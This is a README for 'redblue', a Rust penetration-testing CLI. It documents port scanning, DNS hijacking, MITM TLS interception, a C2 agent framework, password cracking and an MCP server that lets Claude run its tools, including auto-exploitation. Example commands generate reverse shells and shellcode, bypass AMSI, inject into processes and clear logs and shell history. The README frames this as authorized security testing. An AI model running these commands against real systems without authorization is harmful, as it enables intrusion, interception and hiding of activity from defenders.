<div align="center">

# redblue

**The Ultimate Security Arsenal in a Single Binary**

[![Rust](https://img.shields.io/badge/rust-1.70%2B-orange.svg)](https://www.rust-lang.org)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![CI](https://github.com/forattini-dev/redblue/workflows/CI/badge.svg)](https://github.com/forattini-dev/redblue/actions/workflows/ci.yml)
[![GitHub release](https://img.shields.io/github/v/release/forattini-dev/redblue?include_prereleases&label=latest)](https://github.com/forattini-dev/redblue/releases)

*90+ security commands. 40+ protocols from scratch. Zero dependencies. 100% Rust.*

```bash
curl -fsSL https://raw.githubusercontent.com/forattini-dev/redblue/main/install.sh | bash
```

[**Documentation**](https://forattini-dev.github.io/redblue/) |
[Quick Start](#quick-start) |
[Install](#installation)

</div>

### JavaScript / TypeScript

Use `redblue-cli` to run `rb` from JavaScript/TypeScript ecosystems (npm, npx, CI and scripts).

```bash
# Local install (project dependency)
npm install redblue-cli

# Run through package name
npx redblue-cli dns record lookup example.com --type MX

# Explicit binary invocation (also supported by npm exec)
npm exec --package redblue-cli rb -- dns record lookup example.com --type MX
```

```bash
# Global install
npm i -g redblue-cli
rb dns record lookup example.com --type MX
```

---

## What is redblue?

**redblue** replaces your entire security toolkit with a single, self-contained binary.

No installation scripts. No dependency chains. No version conflicts. Just download and execute.

Need JavaScript integration? The optional `redblue-cli` npm package wraps the same `rb` binary, supports `npx` and `npm exec`, and exposes a programmatic SDK for Node.js consumers.

Every network protocol is implemented **from scratch** using only Rust's standard library. DNS, HTTP/1.1, HTTP/2, TLS 1.2, TLS 1.3, Kerberos, SSH, LDAP, SMB, and 30+ more -- all built from first principles with only `libc` as a dependency.

### At a Glance

| Metric | Value |
|--------|-------|
| CLI commands | 90+ |
| Protocols from scratch | 40+ |
| Secret detection patterns | 180+ |
| Crypto primitives | 18+ |
| Runtime dependencies | 1 (`libc`) |

---

## Features

| Category | Capabilities |
|----------|-------------|
| **Network** | SYN/UDP/Stealth scanning, OS fingerprinting, service detection, traceroute, netcat, ping, health monitoring |
| **DNS** | Record lookup, zone transfer, DNS server with hijacking, DNS-over-HTTPS, DNS fingerprinting |
| **Recon** | Subdomain bruteforce/passive, WHOIS, RDAP, CT logs, Wayback, email/username OSINT, breach detection, IP intel, Google dorking |
| **Web** | Fuzzing (dir/vhost/param), CMS fingerprinting, crawling, DOM parsing, CSS selectors, HAR recording, .git scanner |
| **TLS** | Cipher enumeration, certificate audit, Heartbleed detection, OCSP check, CT log verification, JA3/JA3S fingerprinting |
| **Auth** | Credential testing (Basic/Digest/Form/SSH/FTP/SMTP), brute-force with rate limiting and lockout detection |
| **Exploit** | Privesc enumeration, lateral movement, persistence, reverse shells, browser exploitation, payload generation, CVE database |
| **Binary** | ELF/PE parsing, checksec, ROP gadget finder, shellcode generation, format string analysis, packing detection |
| **Password** | Hash cracking (dictionary/mask/hybrid), bcrypt, auto format detection, mutation rules |
| **Evasion** | Sandbox/VM detection, string obfuscation, anti-debugging, memory encryption, AMSI bypass, process injection, track covering |
| **Secrets** | 180+ patterns across cloud, DevOps, databases, AI/ML, payment, social media, private keys, generic tokens |
| **Vuln Intel** | CVE search (NVD/OSV), CISA KEV, Exploit-DB, MITRE ATT&CK mapping, IOC extraction, TAXII 2.1 client |
| **Proxy** | HTTP CONNECT, SOCKS5, transparent proxy, MITM TLS interception, interactive shell (k9s-style TUI) |
| **Agent** | C2 server/client with encrypted transports (HTTP/DNS/WebSocket), forward secrecy ratcheting, multi-agent crew |
| **Crypto** | File vault (AES-256-GCM), encoding/decoding, classical ciphers, CyberChef-style recipes, crypto analysis |
| **Storage** | RedDB: B-tree + graph + vector engine with SQL/Gremlin/Cypher/SPARQL queries, ACID transactions, WAL |
| **Memory** | Process memory scanner (Cheat Engine-style), value/pattern/AOB scanning, hex editor (Linux) |
| **Playbooks** | Automated pentest workflows with MITRE ATT&CK mapping, APT emulation, variable substitution |
| **Graph** | Attack path analysis, blast radius, lateral movement mapping, Mermaid diagram export |
| **MCP** | Model Context Protocol server for Claude AI integration with 18 tool modules and intelligent orchestration |
| **Code** | Static analysis, secrets scanning, dependency analysis, SARIF export |
| **Cloud** | Subdomain takeover detection, S3 bucket scanning, cloud service enumeration |
| **Scripting** | Built-in scripting engine for custom automation |
| **Report** | Pentest report generation from loot, findings, and attack graphs |

---

## Quick Start

```bash
# Install (one command)
curl -fsSL https://raw.githubusercontent.com/forattini-dev/redblue/main/install.sh | bash

# Network reconnaissance
rb network ports scan 192.168.1.1 --preset common
rb network host discover 10.0.0.0/24
rb ping 8.8.8.8
rb nc 192.168.1.1 80

# DNS
rb dns record lookup example.com --type MX
rb dns-server start --hijack "*.evil.com=10.0.0.1"

# Subdomain enumeration
rb recon domain subdomains example.com --passive
rb recon domain subdomains example.com --resolve -o json
rb recon domain bruteforce example.com -w wordlists/subdomains.txt

# Web fuzzing & security
rb web fuzz http://example.com/FUZZ -w common.txt -fc 404
rb web asset security http://example.com
rb web asset crawl http://example.com --har crawl.har

# TLS audit
rb tls security audit example.com

# Vulnerability intelligence
rb intel vuln search nginx 1.18.0
rb intel vuln cve CVE-2021-44228
rb intel vuln kev --stats
rb intel mitre technique T1059

# Credential testing
rb auth test http://example.com/login -u users.txt -p pass.txt --type form

# Password cracking
rb password crack hashes.txt -w rockyou.txt --rules

# Secrets detection
rb code secrets scan . --git

# Exploitation (AUTHORIZED USE ONLY)
rb exploit privesc enumerate
rb exploit payload shell bash 10.0.0.1 4444

# Binary analysis
rb binary elf analyze /usr/bin/target
rb binary rop gadgets ./vulnerable_binary

# MITM proxy
rb proxy mitm --port 8080 --intercept

# Crypto vault
rb crypto vault encrypt secrets.txt
rb crypto recipe "base64_encode | hex_encode" "hello"

# Process memory (Linux)
rb memory scan --pid 1234 --value 42

# Attack planning & playbooks
rb attack target plan example.com
rb attack target run apt29 example.com --dry-run

# Pentest reporting
rb report pentest preview acme-external
rb report pentest generate acme-external --format md
rb report pentest stats

# Compatibility (legacy automation)
rb report pentest generate --project acme-external

# Local host inventory
rb system host inspect --json
# Cross-platform capability map (implemented vs unavailable collectors)
rb system host inspect --json | jq '.capabilities.collectors'

# MCP server (for Claude AI)
rb mcp serve
```

### Pentest Workflows

redblue is also built for real pentest workflows, not just isolated point commands. A typical flow looks like this:

```bash
# 1. Recon and validation
rb recon domain subdomains example.com --resolve -o json
rb web asset security https://example.com
rb tls security audit example.com

# 2. Vulnerability intelligence and attack planning
rb intel vuln scan https://example.com --deep
rb attack target plan example.com
rb exploit payload playbooks

# 3. Controlled execution helpers
rb attack target run apt29 example.com --dry-run
rb mitm intercept generate-ca --output ./certs
rb mitm intercept proxy --proxy-port 8080

# 4. Reporting
rb report pentest preview acme-external
rb report pentest generate acme-external --format md
rb report pentest stats
```

### JavaScript / npm Quick Start

```bash
# Run the wrapper without installing it globally
npx redblue-cli dns record lookup example.com --type MX
npm exec --package redblue-cli rb -- tls security audit github.com

# Install the wrapper in a project
npm install redblue-cli
npx rb network ports scan 192.168.1.1 --preset common

# After install, use the exposed rb bin
npx rb --version
```

```js
const { createClient } = require('redblue-cli');

(async () => {
  const rb = await createClient();

  const records = await rb.dns.record.lookup({
    target: 'example.com',
    type: 'MX'
  });

  console.log(records);
})();
```

### TypeScript

```ts
import { createClient } from 'redblue-cli';

(async () => {
  const rb = await createClient();
  const records = await rb.dns.record.lookup({
    target: 'example.com',
    type: 'MX'
  });
  console.log(records);
})();
```

`redblue-cli` ships with bundled TypeScript declarations so `createClient`, `runCli` and SDK routes are auto-completed in editors.

---

## Protocols from Scratch

Every protocol is implemented from first principles -- no external crates, no wrappers.

| Category | Protocols |
|----------|-----------|
| **Web** | HTTP/1.1 (RFC 2616), HTTP/2 (RFC 7540) with HPACK/Huffman, HTTPS |
| **Security** | TLS 1.2 (RFC 5246) with ECDHE + AES-GCM + X.509 verification, TLS 1.3 key schedule |
| **Name Resolution** | DNS (RFC 1035), DoH (RFC 8484), WHOIS (RFC 3912), RDAP (RFC 7480) |
| **Authentication** | Kerberos 5 (RFC 4120) with PKINIT + S4U, SSH (RFC 4253) |
| **Directory** | LDAP (RFC 4511), SNMP (RFC 1157) |
| **File Transfer** | FTP (RFC 959), SMB/CIFS |
| **Mail** | SMTP (RFC 5321) |
| **Remote Access** | Telnet (RFC 854) |
| **Databases** | MySQL, PostgreSQL, MSSQL (TDS), MongoDB, Redis |
| **Network** | TCP, UDP, ICMP (RFC 792), raw sockets, packet crafting |
| **Encoding** | ASN.1/DER (RFC 2459), X.509 certificates, HAR 1.2, CSS selectors |

### Cryptography (Pure Rust)

| Type | Implementations |
|------|----------------|
| **Hash** | SHA-256, SHA-384, SHA-512, SHA-1, MD5 |
| **Symmetric** | AES-128, AES-256-GCM, ChaCha20-Poly1305 |
| **Asymmetric** | RSA, ECDH, P-256 (NIST), X25519 |
| **Key Derivation** | PBKDF2, HKDF (RFC 5869), TLS PRF (1.0/1.1/1.2), TLS 1.3 key schedule |
| **MAC** | HMAC-SHA256, HMAC-SHA384, HMAC-SHA1, HMAC-MD5 |
| **Utility** | CSPRNG (OS-backed), UUID, Base64, Hex, BigInt arithmetic |

---

## Exploitation Framework

> **AUTHORIZED USE ONLY** -- pentesting, CTF, bug bounty, education, your own audits.

```bash
# Privilege escalation enumeration
rb exploit payload privesc
rb exploit payload suggest example.com

# Attack planning and playbooks
rb exploit payload plan example.com
rb exploit payload playbooks
rb exploit payload apt
rb attack target plan example.com
rb attack target run apt29 example.com --dry-run

# Reverse shells
rb exploit payload shell bash 10.0.0.1 4444

# CVE database
rb intel vuln cve CVE-2021-44228
```

---

## MITM Proxy & Interactive Shell

Full man-in-the-middle proxy with a k9s-style TUI for real-time traffic inspection.

```bash
# Generate a local CA for interception
rb mitm intercept generate-ca --output ./certs

# Start MITM proxy with TLS interception
rb mitm intercept proxy --proxy-port 8080 --ca-cert ./certs/mitm-ca.pem --ca-key ./certs/mitm-ca-key.pem

# Full DNS hijack + TLS interception flow
rb mitm intercept start --target *.example.com --proxy-ip 10.0.0.5

# Interactive proxy shell
rb mitm intercept shell --proxy-port 8080
```

**Interactive shell features:**
- Real-time request/response streaming
- Intercept and modify requests on-the-fly
- History browsing, filtering, and replay
- Security header stripping for testing
- WebSocket upgrade support

---

## C2 Agent Framework

> **AUTHORIZED USE ONLY**

Lightweight C2 framework with encrypted communications and forward secrecy.

```bash
# Start C2 server
rb agent server --port 4444

# Connect agent to server
rb agent connect --server 10.0.0.1:4444

# Interactive agent shell
rb agent shell
```

**Features:**
- Multiple transports: HTTP/HTTPS, DNS covert channel, WebSocket
- Forward secrecy with key ratcheting
- Multi-agent crew coordination
- Custom encrypted protocol

---

## Binary Analysis

```bash
# ELF analysis
rb binary elf analyze ./target_binary
rb binary elf checksec ./target_binary

# PE analysis
rb binary pe analyze ./target.exe

# ROP gadgets
rb binary rop gadgets ./vulnerable_binary

# Shellcode generation
rb binary shellcode generate --arch x86_64 --type reverse_shell
```

---

## Evasion Suite

> **AUTHORIZED USE ONLY** -- for testing defenses and security controls.

16 evasion techniques for testing security products:

```bash
# Sandbox/VM detection
rb evasion sandbox detect

# String obfuscation
rb evasion obfuscate --input payload.bin

# Anti-debugging
rb evasion antidebug check

# Memory encryption
rb evasion memory encrypt --pid 1234

# Track covering
rb evasion tracks clear --logs --history
```

---

## Password Cracking

```bash
# Dictionary attack
rb password crack hashes.txt -w rockyou.txt

# Mask attack (hashcat-style)
rb password crack hashes.txt --mask "?u?l?l?l?d?d?d?d"

# Hybrid (dictionary + mask)
rb password crack hashes.txt -w words.txt --mask "?d?d?d"

# Auto-detect hash format
rb password crack auto hashes.txt
```

Supports: MD5, SHA-1, SHA-256, SHA-512, bcrypt, NTLM, and more.

---

## Process Memory Scanner

Linux-only, Cheat Engine-style memory inspection:

```bash
# Scan for a value
rb memory scan --pid 1234 --value 100

# Pattern/AOB scan
rb memory scan --pid 1234 --pattern "48 8B ?? ?? 89"

# Hex editor
rb hex view /path/to/binary
rb hex edit /path/to/file --offset 0x100
```

---

## Vulnerability Intelligence

Aggregates data from multiple authoritative sources:

| Source | Description |
|--------|-------------|
| **NVD** | NIST National Vulnerability Database -- CVE details, CVSS scores, CPE matches |
| **OSV** | Open Source Vulnerabilities -- Package-specific vulns (npm, PyPI, Cargo) |
| **CISA KEV** | Known Exploited Vulnerabilities -- Actively exploited CVEs with deadlines |
| **Exploit-DB** | Public exploits, PoCs, Metasploit modules |
| **MITRE ATT&CK** | Tactics, techniques, and procedures mapping |

```bash
rb intel vuln search nginx 1.18.0
rb intel vuln cve CVE-2021-44228
rb intel vuln kev --stats
rb intel vuln exploit "Apache Struts"
rb intel mitre technique T1059
rb intel ioc extract report.txt
rb intel taxii discover https://taxii.example.com
```

### Risk Score

```
Risk = (CVSS x 10) + Exploit Bonus (+25) + KEV Bonus (+30) + Age Factor + Impact Modifier
```

---

## Pentest Playbooks

Automated security assessment workflows with MITRE ATT&CK mapping:

```bash
# Build recommendations from recon
rb attack target plan example.com

# List available exploit playbooks
rb exploit payload playbooks

# Run APT emulation
rb attack target run apt29 10.0.0.0/24

# Dry run
rb attack target run apt29 10.0.0.1 --dry-run
```

Playbooks support variable substitution, conditional execution, and action recording.

---

## MCP Server (Claude AI Integration)

redblue includes a full Model Context Protocol server enabling Claude to use all security tools:

```bash
# Start MCP server
rb mcp serve
```

**18 tool modules:** network, DNS, web, recon, TLS, crypto, binary, code, password, evasion, vulnerability, intelligence, file, wordlist, vector search, and auto-exploitation.

**10 prompt generators:** API security, attack planning, cloud security, compliance, container security, defense, mobile security, network security, recon guidance, threat modeling.

---

## Crypto Toolkit

Beyond the vault, redblue includes a full crypto toolkit:

```bash
# File encryption vault (AES-256-GCM)
rb crypto vault encrypt secrets.txt
rb crypto vault decrypt secrets.vault

# Encoding/decoding
rb crypto codec base64 encode "hello world"
rb crypto codec hex decode "48656c6c6f"

# CyberChef-style recipes
rb crypto recipe "base64_encode | rot13 | hex_encode" "secret"

# Crypto analysis
rb crypto analysis entropy suspicious_file.bin

# Classical ciphers
rb crypto cipher caesar "hello" --shift 13
rb crypto cipher vigenere "hello" --key "secret"
```

---

## RedDB: Unified Storage Engine

Multi-modal storage engine unifying relational tables, property graphs, and vector embeddings.

### Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                      Query Layer                            │
│  SQL | Gremlin | Cypher | SPARQL | Natural Language        │
├─────────────────────────────────────────────────────────────┤
│  Security Queries  |  Multi-Mode Executor  |  RAG Engine   │
├─────────────────────────────────────────────────────────────┤
│  Result Cache  |  Materialized Views  |  Query Plan Cache  │
├─────────────────────────────────────────────────────────────┤
│              SIEVE Page Cache + Aggregation Cache           │
├─────────────────────────────────────────────────────────────┤
│  Tables (B-Tree)  |  Graphs (Adjacency)  |  Vectors (HNSW) │
├─────────────────────────────────────────────────────────────┤
│              Page-Based Storage (4KB) + WAL + Encryption    │
└─────────────────────────────────────────────────────────────┘
```

### Features

| Feature | Description |
|---------|-------------|
| **Storage modes** | B-Tree tables, adjacency graph, HNSW vectors |
| **Query languages** | SQL, Gremlin, Cypher, SPARQL, natural language |
| **Transactions** | ACID with MVCC snapshot isolation |
| **Durability** | Write-ahead logging |
| **Encryption** | At-rest encryption with keyring |
| **Caching** | SIEVE page cache, result cache, plan cache, aggregation cache |
| **Vector search** | HNSW + tiered quantization (binary + int8) |
| **Graph algorithms** | PageRank, betweenness centrality, Dijkstra, Louvain, cycle detection |
| **Import** | JSONL streaming, Parquet columnar |
| **SIMD** | Runtime-detected SSE/AVX/FMA for vector distance (26M+ ops/sec) |

### Cross-Modal Queries

```sql
-- Find hosts with critical CVEs reachable in 3 hops
SELECT h.hostname, c.cve_id, v.similarity_score
FROM hosts h
JOIN vulnerabilities v ON h.id = v.host_id
WHERE h.criticality > 8
  AND VECTOR_SIMILARITY(e.embedding, $query) > 0.85
  AND EXISTS (
    SELECT 1 FROM attack_paths p WHERE p.target = h.id AND p.hops <= 3
  )
```

---

## CLI Architecture

```
rb [domain] [resource] [verb] [target] [flags]
rb help
rb [domain] help
rb help [domain] [resource] [verb]
rb [target]              # Magic scan -- auto-detect
rb shell [target]        # Interactive TUI
```

### Domains

| Domain | Description | Example |
|--------|-------------|---------|
| `network` | Port scanning, host discovery, traceroute | `rb network ports scan 10.0.0.1` |
| `dns` | DNS queries, server, hijacking | `rb dns record lookup example.com` |
| `recon` | Subdomain enum, WHOIS, OSINT | `rb recon domain subdomains example.com` |
| `web` | Fuzzing, crawling, scraping, security | `rb web fuzz http://target/FUZZ` |
| `tls` | TLS audit, cipher analysis | `rb tls security audit example.com` |
| `auth` | Credential testing | `rb auth test http://target --type basic` |
| `exploit` | Privesc, payload planning, playbooks | `rb exploit payload privesc` |
| `attack` | Attack planning and guided playbook execution | `rb attack target plan example.com` |
| `binary` | ELF/PE analysis, ROP, shellcode | `rb binary elf checksec ./target` |
| `password` | Hash cracking | `rb password crack hashes.txt -w dict.txt` |
| `evasion` | Anti-analysis, obfuscation | `rb evasion sandbox detect` |
| `intel` | Vuln search, MITRE, IOC, TAXII | `rb intel vuln search nginx` |
| `proxy` | MITM, SOCKS5, transparent | `rb proxy mitm --port 8080` |
| `mitm` | DNS hijack + TLS interception workflows | `rb mitm intercept proxy --proxy-port 8080` |
| `agent` | C2 server/client | `rb agent server --port 4444` |
| `crypto` | Vault, codecs, ciphers, recipes | `rb crypto vault encrypt file.txt` |
| `code` | Secrets scanning, analysis | `rb code secrets scan .` |
| `cloud` | Takeover detection, S3 scanning | `rb cloud takeover example.com` |
| `memory` | Process memory scanning | `rb memory scan --pid 1234` |
| `system` | Local host inventory, runtime detection, and explicit collector capability map | `rb system host inspect --json` |
| `database` | RedDB operations | `rb database query "SELECT * FROM hosts"` |
| `mcp` | MCP server for Claude AI | `rb mcp serve` |
| `report` | Pentest report generation | `rb report pentest generate acme-external --format md` |
| `loot` | Findings and credential management | `rb loot list` |
| `hex` | Hex editor | `rb hex view binary_file` |
| `nc` | Netcat | `rb nc 10.0.0.1 80` |
| `ping` | ICMP ping | `rb ping 8.8.8.8` |

### Global Flags

```bash
-h, --help        # Context-aware help
--version         # Show version
-o, --output      # Format: text|json
--no-color        # Disable colors
```

---

## Installation

### Quick Install

```bash
# Latest stable release
curl -fsSL https://raw.githubusercontent.com/forattini-dev/redblue/main/install.sh | bash

# Pre-release (next channel)
curl -fsSL https://raw.githubusercontent.com/forattini-dev/redblue/main/install.sh | bash -s -- --channel next

# Specific version
curl -fsSL https://raw.githubusercontent.com/forattini-dev/redblue/main/install.sh | bash -s -- --version v0.2.2

# Custom directory
curl -fsSL https://raw.githubusercontent.com/forattini-dev/redblue/main/install.sh | bash -s -- --install-dir /usr/local/bin

# Static build (Alpine/Docker)
curl -fsSL https://raw.githubusercontent.com/forattini-dev/redblue/main/install.sh | bash -s -- --static
```

**Supported Platforms:**
- Linux x86_64, aarch64 (ARM64), armv7
- macOS x86_64 (Intel), aarch64 (Apple Silicon)
- Windows x86_64

### JavaScript / npm

The npm package is a wrapper and SDK. The release binary is fetched during `postinstall` and stored in the package-local path `node_modules/redblue-cli/.redblue/bin` (unless `REDBLUE_SKIP_POSTINSTALL=1` is set).

```bash
# Add the wrapper to your project
npm install redblue-cli

# Run the CLI through the package name
npx redblue-cli dns record lookup example.com --type MX

# Run the rb bin exposed by the package without installing it globally
npm exec --package redblue-cli rb -- network ports scan 192.168.1.1 --preset common

# After local install, the package also exposes rb
npx rb dns record lookup example.com --type A
```

```js
const { createClient } = require('redblue-cli');

(async () => {
  const rb = await createClient({
    binaryPath: '/custom/path/rb'
  });

  const audit = await rb.tls.security.audit({
    target: 'github.com',
    ports: '443'
  });

  console.log(audit);
})();
```

#### TypeScript

```ts
import { createClient } from 'redblue-cli';

(async () => {
  const rb = await createClient();
  const ports = await rb.network.ports.scan({
    target: '192.168.1.1',
    preset: 'common'
  });
  console.log(ports);
})();
```

`npm install redblue-cli` already runs `postinstall` in the normal flow, so the binary should already be provisioned inside the package.
If npm lifecycle scripts are skipped (`REDBLUE_SKIP_POSTINSTALL=1`), install the native binary separately or use the programmatic SDK helpers to provision it.

> **Note:** the exact command `npx rb` works after `redblue-cli` is installed in the project or globally. For zero-install usage, prefer `npx redblue-cli ...` or `npm exec --package redblue-cli rb -- ...`. Use bare `rb --version` to query the real binary version.

### Build from Source

```bash
git clone https://github.com/forattini-dev/redblue
cd redblue && cargo build --release
```

---

## Project Structure

```
src/
  cli/commands/     # 90+ CLI command implementations
  protocols/        # 40+ protocols from scratch (DNS, HTTP, TLS, Kerberos, SSH, ...)
  crypto/           # Pure Rust crypto (AES, ChaCha20, RSA, X25519, P-256, SHA, ...)
  storage/          # RedDB: B-tree + graph + vector engine with SQL/Gremlin/Cypher
  modules/
    network/        # Port scanning, host discovery, traceroute, netcat
    dns/            # DNS operations + DNS server with hijacking
    recon/          # 24+ reconnaissance modules (subdomains, OSINT, breach, ...)
    web/            # Fuzzing, CMS fingerprinting, crawling, DOM parsing
    tls/            # TLS audit, Heartbleed, OCSP, cipher analysis
    exploit/        # Privesc, lateral movement, persistence, payloads, browser exploit
    binary/         # ELF/PE parsing, checksec, ROP gadgets, shellcode
    password/       # Hash cracking (dictionary, mask, hybrid, bcrypt)
    evasion/        # 16 anti-analysis techniques
    proxy/          # MITM, SOCKS5, transparent proxy, interactive shell
    collection/     # Browser credentials, screenshots
    code/secrets/   # 180+ secret detection patterns
    graph/          # Attack path analysis (ShadowGraph)
    memory/         # Process memory scanner + hex editor
    cloud/          # Subdomain takeover, S3 scanning
    auth/           # Multi-protocol credential testing
    monitor/        # Port/service health monitoring
    scripting/      # Built-in scripting engine
    report/         # Pentest report generation
    ctf/            # CTF challenge generation
  agent/            # C2 framework with encrypted transports
  mcp/              # MCP server (18 tool modules, 10 prompt generators)
  playbooks/        # Automated pentest workflows
  intelligence/     # Assessment engine
  ui/               # Terminal graphics (braille canvas, charts)
```

---

## Security & Ethics

> **AUTHORIZED USE ONLY**

redblue is designed for:
- Authorized penetration testing
- CTF competitions
- Bug bounty programs (with scope approval)
- Your own security audits
- Education and research

**Always obtain written authorization before testing systems you don't own.**

---

## Documentation

Full documentation available at:

**[forattini-dev.github.io/redblue](https://forattini-dev.github.io/redblue/)**

- JS SDK guide: [docs/guides/javascript-sdk.md](docs/guides/javascript-sdk.md)

```bash
cd docs && npx docsify-cli serve
```

---

<div align="center">

**[Documentation](https://forattini-dev.github.io/redblue/)** |
**[GitHub](https://github.com/forattini-dev/redblue)** |
**[Releases](https://github.com/forattini-dev/redblue/releases)**

*Made with Rust by security engineers, for security engineers*

</div>
